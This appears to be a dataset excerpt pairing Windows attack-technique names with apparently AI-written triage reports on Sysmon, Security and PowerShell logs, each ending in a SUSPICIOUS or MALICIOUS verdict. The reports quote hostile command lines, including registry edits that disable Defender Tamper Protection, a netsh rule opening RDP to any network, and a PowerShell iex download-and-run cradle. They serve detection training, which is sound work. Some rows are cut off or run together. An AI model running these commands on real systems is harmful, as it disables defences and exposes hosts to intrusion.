The activities logged do not currently suggest any unauthorized or malicious activity, and there are no imminent threats requiring action beyond standard vigilance."
Activate Windows NoRun Group Policy Feature,"Upon detailed analysis of the provided Windows event logs, a potentially concerning activity pattern emerges. Here's the breakdown:

1. **Unusual Registry Edit:**
   - **Cmd.exe Process Execution (EventID: 18003)**
     - The command line for this process is `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f`.
     - This command disables the 'Run' option from Windows Explorer, which is not typically expected in normal user operations, especially if it was executed without user consent or knowledge.
   - **Associated reg.exe Process Execution (EventID: 18005)**
     - Executes a command that corroborates the cmd.exe command to alter registry settings. This policy change can reflect an attempt to hinder user ability to run software or system commands, which might be indicative of a suspicious intent to restrict functionality or setup persistence.

2. **Whoami and Hostname Executions:**
   - **Whoami.exe and Hostname.exe Execution:**
     - Multiple executions of these utilities suggest an attempt to collect system and user context information. While benign under certain circumstances, they raise suspicion when combined with other anomalous activities, particularly as these processes are run with high integrity.

3. **Sysmon Logs Indicating Wevtutil:**
   - Wevtutil.exe runs several times listed in Sysmon logs (EventID 17977, 17981, 17985, 17989, and 17993). While not inherently malicious, repeated runs could indicate log clearing or querying, often performed by threat actors to gather information or cover tracks.

4. **Timing and Integration of Events:**
   - The sequence of these events in close temporal proximity and originating by the same user (SERVER002\admin_test) could suggest automated script execution with objectionable actions such as policy restriction.
   - The process execution originating from a high integrity level user context indicates potentially unauthorized activities exploiting elevated privileges.

**Assessment:**
- The combined use of system utilities to modify registry settings, alongside potential system reconnaissance efforts (via whoami and hostname), raises the concern of potential compromise.
- The logs indicate activities that appear targeted toward modifying system behavior or preparing an environment for restriction or malicious persistence.

**Resolution:**
- **SUSPICIOUS**: The events capture activity that deviates from typical patterns, suggesting potential unauthorized changes or preparatory actions characteristic of initial stages of compromise. This requires further investigation to determine the intent, source, and impact. Specific areas of further exploration include authentication logs for the user SERVER002\admin_test, examination of processes preceding and following these events, and system-wide checks for policy alterations or service disruptions."
Creating W32Time similar named service using sc,"### Analysis of Windows Event Logs

#### System Log

1. **Event 7045 - Service Creation**: An event for a new service creation `win32times` with an `ImagePath` of `cmd /c start c:\\data.004_NonExistingScript.ps1`. The script does not exist, which may indicate a potentially suspicious activity, possibly a failed attempt to create a backdoor or execute a command through a malicious service.

2. **Windows Update Events 44 & 43**: These are normal and relate to standard updates for Microsoft Defender Antivirus. They do not suggest any malicious activity.

#### Sysmon Log

1. **Process Creation Events**:
   - **Event with `cmd.exe`**: The command line shows an attempt to create a service `win32times` with a binary path invoking a non-existing PowerShell script `c:\\data.004_NonExistingScript.ps1`. This resembles a malicious attempt to establish persistence or execute a command stealthily. The user `SERVER002\\admin_test` is associated with these commands, which raises questions about whether the user's account is compromised or acting maliciously.

2. **Frequent Use of `wevtutil.exe` and `conhost.exe`**: The frequent execution of `wevtutil.exe` and `conhost.exe` is peculiar as `wevtutil` is used for event log management, raising suspicion whether someone is trying to manage or clear logs.

3. **Process Execution with High Integrity**: Several processes executed with `High` integrity levels under the same user `SERVER002\\admin_test`, indicating potential privilege misuse.

#### Security Log

1. **Event 5379 - Credential Validation**: Multiple events showing attempts to access credentials with return code `3221226021`, which states an invalid attempt was made. However, without successful credential access or additional context, these do not strongly indicate malicious activity but warrant attention in correlation with other logs.

### Conclusion

- The most notable concern is the event involving the creation of a service `win32times` with a command execution path to a non-existing script. Such behavior is associated with an attempt to establish a backdoor or execute a potentially harmful command. The persistence mechanism through services, especially when it fails, indicates attempts of system compromise.

- Frequent uses of `wevtutil.exe` suggest attempts to query, manage, or tamper with event logs possibly to cover tracks.

### Assessment

**Resolution: SUSPICIOUS**

- The logs indicate activities that are anomalous and potentially malicious, mainly around the suspicious service creation and misuse of privileged accounts. While not conclusively malicious due to the failure of execution and lack of a non-existent script, the behavior warrants further investigation.

### Next Steps

1. **User Account Review**: Investigate the user `SERVER002\\admin_test` for any unauthorized access or irregular activities.

2. **File System Examination**: Look for any scripts or batch files in unusual directories that could suggest unauthorized actions or persistence mechanisms.

3. **Monitor Services**: Check other services for similar unusual command paths or recently modified services.

4. **Log Analysis**: Continue monitoring logs for further irregularities or confirmation of malicious behavior.

5. **Network Traffic Analysis**: Inspect network logs for unusual outbound traffic potentially associated with data exfiltration or command-and-control communications.

These steps should be taken to thoroughly investigate the findings, ensuring the environment's security posture."
Open a local port through Windows Firewall to any profile,"Upon reviewing the provided Windows event logs, the following analysis highlights potential suspicious activity:

### Analysis of Suspicious Activities:
1. **PowerShell Usage and Firewall Rule Creation:**
   - Multiple instances of `powershell.exe` were executed with the command to open TCP port 3389 (RDP) to any incoming network connections.
   - `Powershell.exe` command: `netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any`.
   - Sysmon Event ID 1 for `PowerShell` confirms an attempt to execute this command, indicating potential exposure to remote access vulnerabilities.

2. **Application of Network Command (netsh.exe):**
   - The `netsh.exe` command was invoked, confirming the execution of the previous PowerShell command which modifies firewall settings. 
   - This is typically considered a red flag for intentional port exposure, which can be exploited by malicious actors.

3. **Processes Running under Elevated Privileges:**
   - The events show processes running with high integrity levels, executed under the `SERVER002\admin_test` account. This suggests that the account has administrative access, amplifying the risk if the account is compromised.
   - Multiple instances of `conhost.exe` executed, often a benign occurrence. However, when examined in the context of PowerShell and privilege escalation activities, it becomes a data point worth noting.

4. **Presence of Administrative Tools:**
   - Regular use of tools like `whoami.exe`, `conhost.exe`, and `wevtutil.exe` in close succession indicates possible reconnaissance or system state examination.

5. **Microsoft Edge Updates (Benign in Context):**
   - Numerous entries related to `Microsoft EdgeUpdate.exe` updates appear routine, linked to legitimate update processes. These do not pose a suspicion but provide context of background system maintenance.

### Indicators of Compromise:
- The use of `powershell.exe` to adjust firewall settings suggests an inherent risk and possible compromise, as this behavior is often seen in post-exploitation scenarios.
- The nature and purpose of opening RDP port 3389 to any network could facilitate unauthorized remote control if exploited.

### Assessment:
- **Resolution:** **MALICIOUS**
   - The execution of commands altering firewall rules to open RDP to any external connections unambiguously demonstrates malicious activity. The server is potentially exposed to unauthorized remote access, a common vector for cyber-attacks, compromising the server's integrity and confidentiality.

### Recommended Actions:
1. **Immediate Response:**
   - Close the firewall port 3389 to restrict unauthorized RDP access.
   - Conduct an isolation of the affected host to prevent further unauthorized access.
   
2. **Further Investigation:**
   - Audit user accounts and permissions, verifying legitimate use and modification rights.
   - Examine recent administrative account activities for potential unauthorized changes or access.
   
3. **Long-Term Actions:**
   - Strengthen network policies and security through regular patching, ensuring robust security configurations.
   - Deploy intrusion detection systems (IDS) to monitor and prevent recurrence of similar attacks.
   - Conduct organization-wide security awareness training, focusing on identifying and escalating suspicious behavior.

In conclusion, the assessment identifies clear indicators of a malicious attempt to exploit the system via exposed RDP access, necessitating immediate remediation actions."
Abusing Windows TelemetryController Registry Key for Persistence,"Upon reviewing the provided Windows event logs, several elements were analyzed to identify any suspicious or anomalous behavior:

1. **Sysmon Logs:**
   - Frequent execution of common system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `cmd.exe`) is relatively normal. However, these can be indicative of malicious activity when run with certain arguments or in specific contexts.
   - The `cmd.exe` executes a registry modification command (`reg add`). This action manipulates registry keys without immediately obvious context, which could imply potential persistence mechanisms or configuration changes by malware.
   - There was a registry key addition done using `cmd.exe` with a reference to `notepad.exe`. Modifying registry keys, especially under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController`, is unusual and could suggest an attempt to leverage registry autorun features. This might be intended to facilitate persistence or obfuscation.
   - It is notable that despite the high-integrity level of these processes, the pattern of execution, particularly around registry changes, merits more scrutiny.

2. **Edge Update Process:**
   - The logs show several executions related to the Microsoft Edge Update process which is legitimate, as it involves software update operations. However, due to the complexity and the number of these processes occurring in rapid succession, log examination revealed no irregularities within these executions indicative of immediate threat.

3. **System and Application Logs:**
   - The logs captured events for standard operational activities, such as time synchronization with NTP servers and routine software protection platform activities, without any notable anomalies.

**Assessment and Recommendations:**
- **Identified Risk:** The major point of interest is the registry modification through `cmd.exe`. Although `notepad.exe` in itself is a non-malicious application, the way this registry configuration is being adjusted could potentially be leading towards more elaborate malicious configurations or persistence tactics.
  
- **Conclusion:** Based on the registry modification represented in the Sysmon logs, while there is no definitive evidence of malicious behavior (such as known malware or exploitation sequences), there is enough unusual behavior, particularly related to registry keys, that warrants further investigation.

**Resolution: SUSPICIOUS**
Diligence is required to confirm the intent behind the registry changes and to ensure they are not indicative of a larger issue. Further investigation should involve:
- Reviewing user activity logs related to `admin_test` to verify expected behavior.
- Confirming if there have been any recent administrative scripts or system changes that involve said registry keys.
- Monitoring for subsequent unusual registry activity.
- Conduct deeper endpoint forensic analysis if additional anomalies are observed."
UACME Bypass Method 56,"Based on the analysis of the provided Windows event logs, there are several key observations that can be made:

1. **Command Execution**: Logs indicate that the Windows command processor (`cmd.exe`) was executed with a command line that references a file path pointing to `56 Akagi64.exe` in a temporary directory. The use of a command shell to execute scripts or programs from temporary directories can be indicative of suspicious behavior, especially if the file `Akagi64.exe` is unknown or not typically used. This may represent a potential drop and execute attack method or privilege escalation attempt involving an external tool.

2. **File Integrity and Hash**: The `cmd.exe` event hosts a hash `SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0`, which should be checked in a malware database or with security teams to ascertain if it has been flagged before.

3. **Use of `wevtutil.exe`**: The frequent execution of `wevtutil.exe`, a command line utility that is typically used to manage event logs, by the same user associated with many other processes could suggest an attempt to tamper with or clear logs, implying malicious intent. 

4. **Repeated Commands**: Several processes like `whoami.exe` and `hostname.exe` are executed, which while on their own are not suspicious, can be part of a reconnaissance process by an attacker on a compromised system.

5. **Adherence to SYSTEM Integrity Level**: Most executions maintaining the `System` integrity level were related to Microsoft Edge Update processes, which is normal for update processes triggered by system tasks or scheduled events. However, it's crucial to ensure these aren't due to a deceptive renamed executable meant to mislead.

6. **Windows Security Defender**: Logs also indicate that Windows Defender was active, which is a positive indicator that the host's defenses were operational. However, without security logs, it is hard to confirm whether any threats were mitigated or logged by Defender.

### Conclusion: SUSPICIOUS

Based on these observations, the activities logged are labeled as ""SUSPICIOUS."" While they do not definitively indicate malicious intent, the presence of potentially anomalous executions such as the one involving `56 Akagi64.exe` and `wevtutil.exe` action, warrants further investigation. It is advisable to:
- Verify the authenticity and origin of `56 Akagi64.exe`.
- Cross-check the hash values against known databases for malicious indicators.
- Monitor for any unauthorized changes or other suspicious activity on the system.
- Review historical access logs for the user “admin_test” to determine their behavior pattern.
- Validate the necessity and configuration of the applications and services that were executed, especially those under `NT AUTHORITY\SYSTEM`.

Further security analysis and monitoring tools should be employed to continue investigating these anomalies and determine if they pose any risks to the system."
Tamper Win Defender Protection,"### Detailed Analysis of Provided Logs

#### Security Log Events:
The main anomaly from the security logs is the events with EventID 4616 which indicate changes in the system time. Changing system time can sometimes be associated with malicious activities that attempt to cover tracks by altering timestamps. However, since this adjustment happens within a span of seconds and is being executed by the `svchost.exe` process under `LOCAL SERVICE`, it could potentially be part of regular time synchronization rather than malicious activity. The service running under `LOCAL SERVICE` (S-1-5-19) suggests that the operation is legitimate as this SID corresponds to a predefined local account for services.

#### System Log Events:
The system logs also show time changes, correlating with the security log. Notably, Microsoft's Windows Time Service is syncing with `time.windows.com`, which is a standard time synchronization event. These are reasons to attribute time changes to routine time sync operations rather than malicious intervention since the source is a trusted NTP server.

#### Sysmon Log Events:
Sysmon events provide detailed tracking of process executions:

1. **Usage of the `wevtutil.exe`**: The execution of `wevtutil.exe` and `conhost.exe` by `admin_test` seem to occur frequently. Wevtutil is a legitimate command-line utility for managing event logs, and usage by an admin account is not unusual but could be used maliciously to clear or tamper with event logs.

2. **Registry Modification via `cmd.exe`**: A suspicious command was executed using `cmd.exe` to modify the Windows Defender registry setting for `TamperProtection`, setting the value to `0`. This behavior is highly suspect because disabling tamper protection can be a step towards disabling security features for further exploitation.

3. **Execution of Microsoft Edge Update**: Several instances of Microsoft Edge Update executables running under `NT AUTHORITY\SYSTEM` in various contexts (update, registration, etc.). The Edge Update process chaining is typical of the legitimate update process for applications like Microsoft Edge.

#### Application Log Events:
The application logs appear mostly benign, with EdgeUpdate stopping services, which aligns with the standard behavior seen in application updates. No direct indicators of application-level compromises are noted.

### Assessment of the Situation:
Based on the analysis:
- **Tamper Protection Disablement**: The use of `cmd.exe` to disable Windows Defender Tamper Protection is a strong indicator of potentially malicious intent. This action requires admin rights and is suspicious as it undermines system security.

- Although other log entries appear typical for system maintenance and updates (such as time synchronization and software update processes), the specific registry alteration to Windows Defender settings indicates potential malicious activity.

### Final Resolution:
- **MALICIOUS**: The deliberate deactivation of critical security features signifies malicious activity. While some log entries appear routine, this specific action indicates that the system was likely tampered with for potential further exploitation.

### Guidance on How to Proceed:
- **Immediate Actions**:
  1. **Isolate the Host**: Disconnect the affected system from the network to prevent further propagation or data exfiltration.
  2. **Conduct a Thorough Investigation**: Utilize more comprehensive forensic tools to investigate other suspicious activities.
  3. **Restore Security Settings**: Ensure the Windows Defender settings, including Tamper Protection, are reinstated.
  4. **Perform Scans**: Run in-depth anti-malware and antivirus scans.
- **Long Term Actions**:
  1. **Review User Activity**: Check `admin_test` account activities for unauthorized access or privilege abuse.
  2. **Audit and Monitor**: Increase monitoring for similar registry changes, and deploy alerts for such modifications.
  3. **Implement Enhanced Security Protocols**: Enhance endpoint protection strategies and consider endpoint detection and response solutions for better activity tracking and response.

These steps will help ensure that any vulnerabilities are mitigated swiftly and that the host systems are considered secure moving forward."
Control Panel Items,"Upon reviewing the provided logs, several key observations and analyses can be made to determine the nature of any suspicious or malicious activity:

**1. General Activity Overview:**

The logs primarily consist of Sysmon logs detailing process creation and termination events on a system identified as ""Server002"". The activities involve various system processes and components of Microsoft Edge Update, which is a legitimate Microsoft application responsible for updating the Edge browser.

**2. Sysmon Log Observations:**

- Multiple entries for `MicrosoftEdgeUpdate.exe` and related executables (e.g., `MicrosoftEdgeUpdateComRegisterShell64.exe`) indicate the update process. The frequent execution of these processes suggests a normal automated update routine for Microsoft Edge.
  
- High-integrity level processes like `wevtutil.exe` (event utility) and `conhost.exe` (Console Window Host) are also seen alongside normal system functionalities like `hostname.exe` and `whoami.exe`, showing typical system administration or user environment commands.
  
- The use of `cmd.exe` to invoke `control.exe` with a `.cpl` (Control Panel item), eventually leading to `calc.exe` (calculator), warrants attention. This could indicate an attempt to exploit a Control Panel item to execute code, yet the underlying executables like `rundll32.exe` and `conhost.exe` do not inherently indicate malicious intent without further context.

**3. Potentially Anomalous Activity:**

- The execution path involving `cmd.exe` and the `.cpl` file (seen in ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.002\\bin\\calc.cpl"") might be a pathway for suspicious behavior if unauthorized, especially if this Control Panel item is not recognized or documented as part of regular operations.

- Without additional information about the legitimacy of the file located in the Temp directory or its intended purpose, its presence alongside other benign system activities generates a ""SUSPICIOUS"" indicator rather than a definite malicious finding.

**4. Assessment and Resolution:**

- **Assessment:** The activities documented in the logs reflect a mixture of typical system processes and potentially suspicious execution paths. The behaviors surrounding Microsoft Edge Update align with benign update mechanics and are not unusual.

- **Threats/Risks:** While the logs largely reflect routine processes, the use of temporary directories and Control Panel items in executing standard system utilities (like `calc.exe`) may point toward a scripted or manual administrative task which needs further validation to rule out script-based exploitation or unauthorized admin activity.

- **Guidance and Next Steps:**
  - Perform a detailed review of new files or scripts in ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\"" directory, especially `calc.cpl`.
  - Check scheduled tasks, startup entries, or group policies on ""Server002"" to ensure they're authorized and not manipulated for persistence.
  - Consider conducting a file integrity check or hash comparison on `control.exe`, `calc.exe`, and their derivatives against known baselines to validate legitimacy.

**Final Resolution: SUSPICIOUS**

The evidence suggests the need for additional investigation, particularly around the scripts or tasks using temporary files for executing standard system utilities. Until verified as normal, treating it as suspicious is prudent."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Let's analyze the provided Windows event logs for any indicators of malicious activity or unusual behavior.

### Sysmon Log Analysis
1. **Execution of Powershell and MSI Installer**:
   - The log entries show the execution of `powershell.exe` with an `Invoke-CimMethod` command performing an installation of an MSI package from a temp directory (Event ID 1, Process ID 5096).
   - This behavior is often associated with software installation or updates, as the `Win32_Product` class is commonly used for product installations.
   
2. **Frequent Use of `conhost.exe` and `wevtutil.exe`**:
   - `conhost.exe` instances frequently accompany other processes, which is normal behavior as it provides a command line interface for command execution and management.
   - `wevtutil.exe` also appears regularly, likely used for event log operations, which can be either benign or part of cleaning or clearing logs in a malicious activity context. However, without more context, this does not inherently indicate malicious intent.

3. **Microsoft Edge Update Activity**:
   - Several entries show `MicrosoftEdgeUpdate.exe` processes executing various operations, consistent with an update procedure triggered for Microsoft Edge. This is considered benign activity unless further details suggest tampering or an unusual update source.
   
4. **Process Creation and Execution**:
   - The execution of `whoami.exe` (Process ID 2516) is generally benign, used to query user identity information.
   - Use of `hostname.exe` can also be routine and is not suspicious in isolation.
   
5. **Suspicious Temp Location Execution**:
   - The concerning part is the execution from a temp directory (Event ID 1, Image `C:\\Windows\\Installer\\MSI9CF4.tmp`). Execution from temp can sometimes be indicative of malicious activity if artifacts are dropped and run from there.
   - However, since the installation is logged in the Application Log (MsiInstaller events), this seems to be a legitimate installation process completing successfully.

### Application Log Analysis
1. **MSI Installer**:
   - The application logs confirm the successful installation of a package named ""file file Test Installer."" The installation completed successfully, as evidenced by MsiInstaller Event IDs 1040 and 11707.
   
### Windows PowerShell Log
1. **PowerShell Script Execution**:
   - The PowerShell log shows events of the script execution, aligning with the installation activities observed. No errors or exceptions were logged, implying successful execution of intended tasks.

### Security and Other Logs
- Both the Security and System logs provided were empty. Without additional context or logs, it’s challenging to assess whether privilege escalation or unauthorized access attempts were made.

### Conclusion and Recommended Actions
- **Assessment**: SUSPICIOUS
  - The execution of a potentially unknown MSI from a temp directory via PowerShell could be routine for certain operations but warrants attention due to its context and location.
  - The active Microsoft Edge Update processes appear legitimate, but consistent monitoring should be maintained.

- **Guidance**:
  1. **Verification**: Ensure the MSI package being installed is from a known and verified source. Review the installation process and purpose of the 'file file Test Installer' to confirm it aligns with expected behavior.
  2. **Monitoring**: Keep an eye on unpredictable behaviors or additional unsanctioned installations that might follow this initial activity.
  3. **Check Integrity**: Use the hash values provided to verify binaries against known clean versions if concerns persist.

Overall, while no direct malicious activities have been unequivocally identified, maintaining a cautious outlook and further investigation is justified to rule out covert operations."
Disable Windows Toast Notifications,"Upon detailed analysis of the provided Windows event logs, here's the assessment:

### Observations:

1. **Windows System Log:**
   - The system logs contain regular events related to time synchronization and kernel updates. The svchost.exe process is commonly utilized by system services, and there are no alarming changes or statistics in the timezone or time changes worthy of concern.

2. **Sysmon Log Analysis:**
   - A repeated pattern of executions involving `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` is noted. The use of `wevtutil.exe` typically signifies log management activities, and while it is not inherently malicious, an unexpected use might be worth further verification of administrator actions or scheduled tasks.
   - The execution of common utilities like `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` is noticed. However, the command-line argument involved in the `cmd.exe` execution suggests a Registry modification:
     - `cmd.exe` `/c reg add ...` to modify Windows registry settings related to PushNotifications. This kind of modification could be indicative of an attempt to disable or control notification settings, a behavior often seen in scripts or administrative maintenance tasks.

3. **Security Log:**
   - The security logs are not provided, so there is no data to analyze concerning user authentication, logon attempts, or related security visibility.

4. **Sysmon Details:**
   - A increased number of `cmd.exe` processes and associated registry edits without apparent confirmations suggest possible scripted changes or automated tasks.
   - The hash values and user context (""SERVER002\\admin_test"") execution of system utilities like `reg.exe` and frequent registry changes are suspicious due to the volume and context of occurrence in a short window of time.

5. **Application Log:**
   - Contains logs related to the Software Protection Platform Service. No immediate or direct anomalous activities are derived from these entries, hence do not provide malicious indicators in isolation.

### Analysis:

- **Suspicious Activities:** The log contains a series of activities around command-line executions and registry modifications under administrator contexts that are not ordinary daily operations unless tied to a verified change or administrative task (e.g., script execution).
  
- **Assessment:** Overall, the activities are suspicious given the automated script-like execution patterns manipulating registry entries without contextual business justification captured here.

### Resolution:

- **SUSPICIOUS**: This case requires further investigation. Data from security logs and potential contextual insights from the user, configuration changes, or correlating events need to be acquired to determine whether activities were authorized or configured tasks or indeed malicious.

### Guidance on Proceeding:

1. **Verification of Activities:** Check if there were any authorized administrative tasks or updates being pushed during this time window.
2. **Contextual Collection & Correlation:** Engage with IT or the user involved (SERVER002\\admin_test) to understand if these changes were part of scheduled administrative actions.
3. **Analyze Further:** Obtain additional security event logs to correlate user actions with possible system policy changes or unauthorized configuration.
4. **Monitoring:** Implement or confirm continued monitoring for similar patterns of behavior and ensure alerts on critical registry changes are active.

Further investigation will clarify if activities were routine administrative tasks or require a deeper security response, including containment and mitigation steps."
Obfuscated Command in PowerShell,"Upon reviewing the provided Windows event logs, here is a detailed analysis and assessment:

### Application Log
No entries were provided in the Application log.

### System Log
1. **Time Change Events**: The Windows Time Service and Kernel-General logs mention time adjustments, likely due to synchronization with time.windows.com. These actions are standard for maintaining accurate system time. Observed changes reflect minor adjustments, typical for time synchronization services.

2. **Windows Update Events**: The Windows Update Client logs indicate a regular update process for Microsoft Defender Antivirus. The updates have successfully been completed, which is consistent with routine maintenance activities.

### Windows PowerShell Log
1. **Suspicious PowerShell Command**:
   - The PowerShell log shows several instances where PowerShell is executed with obfuscated commands. The use of obfuscation, such as string concatenation and type casting, suggests attempts to hide the true intention of the script.
   - This behavior is often indicative of malicious activities as obfuscation is a common tactic used by attackers to bypass security detections.

### Security Log
1. **Time Change Audit Events**: The security logs reflect the same time adjustments noted in the system logs. They were executed by the `svchost.exe` process running as LOCAL SERVICE. This behavior is standard during time synchronization.

2. **Credential Validation Events (Event ID 5379)**:
   - Multiple events with Event ID 5379 indicate unsuccessful attempts at credential validation for a MicrosoftAccount user. The failed attempts resulted in a return code of 3221226021, which signifies a ""credential validation failed"" scenario.
   - Repeated failed credential accesses can indicate a brute force attempt or a compromised system trying to authenticate invalid credentials.

### Sysmon Log
1. **Process Execution**:
   - A large number of executions involving `wevtutil.exe` and `conhost.exe` are logged. These processes are often used in legitimate administrative tasks but can be leveraged for malicious purposes if seen in conjunction with suspicious activities.
   - Hostname and whoami commands were executed, which can be part of reconnaissance activities to gather information about the system.

2. **PowerShell Execution**:
   - `powershell.exe` is executed with the same suspicious obfuscated command as observed in PowerShell logs, confirming its execution on the system.

3. **Regular System Processes**: 
   - Events show normal operations like Windows Update (`wuauclt.exe`) and Microsoft services (`taskhostw.exe`), which do not appear to contribute to malicious behavior.

### Overall Assessment
Based on the logs provided, the key indicator of potential malicious activity is the execution of obfuscated PowerShell commands. The obfuscation and the use of PowerShell suggest the possibility of malicious scripts executing, which warrants further investigation.

### Resolution: SUSPICIOUS
The findings indicate activities that do not look right and require more detailed investigation. It is recommended that:
- A deeper inspection of the PowerShell script used in the obfuscated command is conducted.
- Review endpoint security alerts or logs for further indicators of compromise.
- Monitor this host for any additional unauthorized or suspicious activities.

Conduct a comprehensive threat hunt on the affected host to ensure no security compromise is present."
WinPwn - UAC Bypass DccwBypassUAC technique,"Let's analyze these logs across the different log types to identify any suspicious or potentially malicious activity.

### System Log Analysis
- The system log events are primarily concerned with time changes on the system. The change in time is managed by the `svchost.exe` process, which is typical as this executable hosts several Windows services. There are no signs of unusual behavior such as unexplainable execution or anomalies in the `Kernel-General` and `Time-Service` events.

### Security Log Analysis
- These entries are related to changes in the system time by `svchost.exe` and are associated with the `LOCAL SERVICE` account. The time changes are synchronized with Windows time, and no privilege escalation or unauthorized access is indicated by these logs.

### Windows PowerShell Log Analysis
- There are clear indications of potentially malicious activity in PowerShell logs, where PowerShell was used to execute a command that includes downloading a script from an external URL (`https://raw.githubusercontent.com/script/Creds/master/script/script`) using the `iex` cmdlet and `net.webclient`. This is a known pattern for executing scripts from the internet, often associated with malware or unauthorized behavior.

### Sysmon Log Analysis
- Sysmon logs show the execution of processes like `whoami.exe`, `hostname.exe`, and `PowerShell.exe`, with specific interest in `PowerShell.exe` because of its command line. It matches with the PowerShell logs showing a potentially malicious script being downloaded.
- The user associated with these activities is `SERVER002\\admin_test`, and the integrity level is high, implying administrative privileges.

### Application Log Analysis
- There are no specific anomalies or issues noted in the application logs that relate to malicious processes or suspicious application behavior.

### Overall Assessment
The key finding here comes from the PowerShell log, corroborated by the Sysmon logs. The use of PowerShell to download and execute a script from a URL is an indicator of malicious activity. This is further supported by administrative privileges used during these operations.

### Final Resolution
- **MALICIOUS**: The logs contain indicators of malicious activity, particularly related to PowerShell usage to download and potentially execute suspicious scripts from an external source.

### Guidance on How to Proceed
1. **Immediate Containment**: Isolate `Server002` from the network to prevent any further malicious actions and spreading.

InstallUtil Install method call,"### Detailed Analysis of Windows Event Logs

The logs provided show the activity on a Windows machine, specifically focusing on PowerShell, Sysmon, Application, and Security logs.

#### Suspicious or Anomalous Behavior

1. **PowerShell Logs**:
    - The logs capture scripts executed that involve a command `Invoke-BuildAndInvokeInstallUtilAssembly` and several variables related to installing an assembly (`data.004.dll`) with InstallUtil.
    - The path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1` is included, indicating script execution from a temporary directory. Activity from temporary directories is often used in malware activities to execute scripts without writing to more persistent locations.
    - The script tries to execute `.NET` commands using `Add-Type`, which is a legitimate activity but commonly utilized in malware for executing malicious code or escalations.
    - The PowerShell command is not generating the expected output but still proceeds with the execution of the dynamic addition of types, which suggests an anomaly.

2. **Sysmon Logs**:
    - Numerous events are recorded involving PowerShell, InstallUtil, .NET Framework executables (csc.exe, cvtres.exe).
    - The execution of `InstallUtil.exe` with the DLL from a user directory is noted. InstallUtil.exe is a legitimate utility used for installing and uninstalling server resources, but it can be abused by adversaries to execute malicious assemblies.
    - Process executions do include PowerShell, which aligns with the PowerShell logs indicating script execution.
    - The Microsoft Edge Update executable is also executed in various modes, reflecting Edge's automatic update process, which is primarily benign unless modifying or executing binaries impermissibly.

3. **Potential Malicious Indicators**:
    - The use of `InstallUtil.exe` in such scripts can be a Red Team tactic or a method of persistence used by malware.
    - Scripts executed from temporary directories and discrepancy between expected vs. actual outputs could hint at crafting malicious DLLs or scripts.
    - No outright malicious behavior is apparent without further context, but the method of execution is common in fileless malware or living-off-the-land attacks.

#### Assessment of the Situation

There is no direct evidence of outright malicious behavior; however, the way scripts and InstallUtil are being used from a temporary location raises significant suspicion. Any deviation from expected output and writing to temporary files suggests an active attempt to stealthily execute potentially harmful code.

#### Guidance and Resolution

1. **Resolution**: **SUSPICIOUS**
   - The activities recorded are suspicious but not confirmed as outright malicious without further context. The noted patterns warrant further investigation.
   
2. **Recommended Actions**:
   - **Investigate the Origin**: Find out who initiated the PowerShell session, and if they have a legitimate reason for executing scripts in such a manner.
   - **Analyze Network Traffic**: Check for any unusual outbound connections following this execution.
   - **File and Hash Analysis**: Verify the integrity and legitimacy of the DLLs and scripts being used by comparing their hashes with known good values.
   - **User Verification**: Check if 'admin_test' account usage aligns with standard operation procedures.
   - **Harden PowerShell Policies**: As an added precaution, enforce logging and policy restrictions for PowerShell execution to prevent unauthorized script execution.

These steps will help confirm if these actions were indeed benign or if security measures need to be enacted."
Scarab Ransomware Defense Evasion Activities,"Upon analyzing the provided Windows event logs for investigation, I have identified several notable points:

1. **Time Change**: The Security log entries, particularly Event ID 4616, indicate a change in the system time. Normally, time synchronization events are benign, especially when associated with normal system processes such as `svchost.exe`. However, time changes can also be indicative of malicious activity if they are used to obfuscate the trail of operations.

2. **Privilege Usage**: Event ID 4672 logged in the Security log shows that privileged accounts (`admin_test`) were granted a range of high privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others. Such privileges can be used for system-wide changes or for performing potentially dangerous activities, like obtaining unauthorized access to other users' data or attacking the system.

3. **Sysmon Logs**: The Sysmon logs capture the execution of various processes. Significant entries include:
   - The execution of `cmd.exe` that runs a command to modify registry settings (`HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters`) which can potentially change security settings.
   - Frequent execution of `MicrosoftEdgeUpdate.exe` which seems legitimate but having multiple instances fired in quick succession, especially from different directory paths, can be a sign of a malicious misuse or hijacked updater process.

4. **Unusual Registry Modification**: The command executed by `cmd.exe` and `reg.exe` is altering the registry setting related to `CredSSP`, which affects remote desktop protocol security. Unauthorized or unintended modifications here could be a vector for a broader attack or exploit.

5. **Microsoft Edge Update**: Multiple events detail various `MicrosoftEdgeUpdate.exe` processes running under `NT AUTHORITY\SYSTEM`. While it can be standard for update processes to run with elevated privileges, the number of update-related events clustered together could suggest a compromised or abused update process.

**Assessment**:
The combination of time alteration, command-line registry edits, use of high-privilege accounts, and the multiple rapid instance executions of named update processes point toward activities that could be classified as suspicious. The behavior of executing a sensitive registry modification and the possibility of hijacked update processes deserve further investigation to rule out malicious intent, especially considering the context in which these actions were carried out.

**Resolution**: **SUSPICIOUS** - The logs indicate activities that do not align with normal behavior and warrant further investigation to definitively identify or rule out any malicious actions. It would be prudent to:
- Check the integrity and source of the `MicrosoftEdgeUpdate.exe` to ensure it's not tampered with.
- Review system integrity and verify that changes in the registry were authorized.
- Investigate the user's intention behind executing such privilege-intensive actions to ensure they are within the scope of their duties.

Work with IT to review these points and ensure that no malicious activity is occurring under the guise of routine system updates or administrative tasks."

   - `wevtutil.exe` is used to manage event logs and could indicate someone is trying to tamper with logs or perform reconnaissance.
   - Frequent execution without a clear reason might indicate scripting or automation.
   
2. **Execution of `cmd.exe` with Firewall Modification:**
